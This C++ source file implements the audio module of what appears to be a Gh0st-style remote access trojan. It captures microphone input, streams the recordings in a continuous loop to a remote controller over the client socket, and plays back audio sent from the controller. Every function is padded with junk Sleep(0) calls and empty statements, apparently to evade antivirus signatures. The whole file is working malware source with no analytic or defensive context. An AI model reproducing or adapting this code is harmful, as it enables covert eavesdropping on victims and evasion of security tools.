// AudioManager.cpp: implementation of the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////

#include "AudioManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
bool CAudioManager::m_bIsWorking = false;

CAudioManager::CAudioManager(CClientSocket *pClient) : CManager(pClient)
{
	if (!Initialize())
		return;
    Sleep(0);
	Sleep(0);
	Sleep(0);
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	Sleep(0);
	Sleep(0);
	Sleep(0);
	BYTE	bToken = TOKEN_AUDIO_START;
	Send(&bToken, 1);
	Sleep(0);
	Sleep(0);
	Sleep(0);
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	Sleep(0);
	Sleep(0);
	Sleep(0);
	// Wait for remote dialog open and init
	WaitForDialogOpen();

	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

}

CAudioManager::~CAudioManager()
{
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
    Sleep(0);
	Sleep(0);
	Sleep(0);
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	Sleep(0);
	Sleep(0);
	Sleep(0);
	delete	m_lpAudio;
}

bool CAudioManager::Initialize()
{
	if (!waveInGetNumDevs())
		return false;
    Sleep(0);
	Sleep(0);
	Sleep(0);
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	Sleep(0);
	Sleep(0);
	Sleep(0);
	// 正在使用中.. 防止重复使用
	if (m_bIsWorking)
		return false;

	m_lpAudio = new CAudio;
    Sleep(0);
	Sleep(0);
	Sleep(0);
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	Sleep(0);
	Sleep(0);
	Sleep(0);
	m_bIsWorking = true;
	return true;
}

int CAudioManager::sendRecordBuffer()
{
	DWORD	dwBytes = 0;
	UINT	nSendBytes = 0;
	LPBYTE	lpBuffer = m_lpAudio->getRecordBuffer(&dwBytes);
	if (lpBuffer == NULL)
		return 0;
	LPBYTE	lpPacket = new BYTE[dwBytes + 1];
	lpPacket[0] = TOKEN_AUDIO_DATA;
	memcpy(lpPacket + 1, lpBuffer, dwBytes);
    Sleep(0);
	Sleep(0);
	Sleep(0);
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	Sleep(0);
	Sleep(0);
	Sleep(0);
	if (dwBytes > 0)
		nSendBytes = Send(lpPacket, dwBytes + 1);
	delete	lpPacket;
    Sleep(0);
	Sleep(0);
	Sleep(0);
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	Sleep(0);
	Sleep(0);
	Sleep(0);
	return nSendBytes;
}

void CAudioManager::OnReceive( LPBYTE lpBuffer, UINT nSize )
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		Sleep(0);
		Sleep(0);
		Sleep(0);
		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		Sleep(0);
		Sleep(0);
	Sleep(0);
		NotifyDialogIsOpen();
		return;
	}
	m_lpAudio->playBuffer(lpBuffer, nSize);
}

DWORD WINAPI CAudioManager::WorkThread( LPVOID lparam )
{
	Sleep(0);
	Sleep(0);
	Sleep(0);
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	Sleep(0);
	Sleep(0);
	Sleep(0);
	CAudioManager *pThis = (CAudioManager *)lparam;
	while (pThis->m_bIsWorking)
			pThis->sendRecordBuffer();

	return -1;
}
